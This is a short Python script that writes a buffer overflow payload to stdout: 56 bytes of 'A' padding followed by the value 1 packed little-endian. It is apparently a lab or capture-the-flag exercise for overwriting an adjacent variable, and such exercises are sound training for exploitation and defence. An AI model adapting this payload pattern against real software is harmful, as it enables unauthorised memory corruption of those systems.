import sys
payload = b"A" *56
payload += b"\x01\x00\x00\x00"
sys.stdout.buffer.write(payload)
